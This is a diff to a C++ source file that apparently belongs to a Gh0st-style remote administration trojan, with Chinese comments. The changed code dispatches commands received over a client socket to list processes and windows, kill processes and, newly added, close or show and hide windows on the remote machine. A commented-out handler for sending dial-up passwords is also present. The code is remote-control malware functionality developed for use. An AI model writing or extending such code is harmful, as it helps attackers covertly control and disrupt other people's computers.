@@ -18,9 +18,16 @@
 
 
 
-CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
+CSystemManager::CSystemManager(CClientSocket *pClient, UINT nWhich) 
+	: CManager(pClient)
 {
-	SendProcessList();
+	// bWhich: COMMAND_SYSTEM(进程管理) FALSE(窗口管理)
+	if (nWhich == COMMAND_PSLIST) {
+		SendProcessList();
+	} 
+	else if (nWhich == COMMAND_WSLIST) {
+		SendWindowsList();
+	}
 }
 
 CSystemManager::~CSystemManager()
@@ -30,21 +37,34 @@ CSystemManager::~CSystemManager()
 void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 {
 	SwitchInputDesktop();
-	switch (lpBuffer[0])
+	switch (lpBuffer[0]) 
 	{
-	case COMMAND_PSLIST:
-		SendProcessList();
-		break;
-	case COMMAND_WSLIST:
-		SendWindowsList();
-		break;
-	case COMMAND_DIALUPASS:
-		//SendDialupassList();
-		break;
-	case COMMAND_KILLPROCESS:
-		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
-	default:
-		break;
+		case COMMAND_PSLIST:
+			SendProcessList();
+			break;
+
+		case COMMAND_WSLIST:
+			SendWindowsList();
+			break;
+
+		case COMMAND_WINDOW_CLOSE:
+			CloseWindow(lpBuffer + 1);
+			break;
+
+		case COMMAND_WINDOW_TEST:
+			TestWindow(lpBuffer + 1);
+			break;
+
+		case COMMAND_DIALUPASS:
+			//SendDialupassList();
+			break;
+
+		case COMMAND_KILLPROCESS:
+			KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
+			break;
+
+		default:
+			break;
 	}
 }
 
@@ -69,6 +89,26 @@ void CSystemManager::SendWindowsList()
 
 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);	
+}
+
+void CSystemManager::CloseWindow(LPBYTE buf)
+{
+	DWORD hWnd;
+	// 得到窗口句柄
+	memcpy(&hWnd, buf, sizeof(DWORD));
+	// 向窗口发送关闭消息
+	::PostMessage((HWND__ *)hWnd, WM_CLOSE, 0, 0);
+}
+
+void CSystemManager::TestWindow(LPBYTE buf)
+{
+	DWORD hWnd;
+	DWORD show;
+	// 得到窗口句柄
+	memcpy(&hWnd, buf, sizeof(DWORD));
+	// 得到窗口处理参数
+	memcpy(&show, buf + sizeof(DWORD), sizeof(DWORD));
+	ShowWindow((HWND__ *)hWnd, show);
 }
 
 #if 0
@@ -239,13 +279,21 @@ bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 		return true;
 	
 	
-	if (lpBuffer == NULL)
+	if (lpBuffer == NULL) {
 		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
-	
+		if (!lpBuffer) {
+			return false;
+		}
+	}
+		
 	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
 	dwOffset = LocalSize(lpBuffer);
 	
-	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
+	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, 
+									LMEM_ZEROINIT|LMEM_MOVEABLE);
+	if (!lpBuffer) {
+		return false;
+	}
 	
 	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
 	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
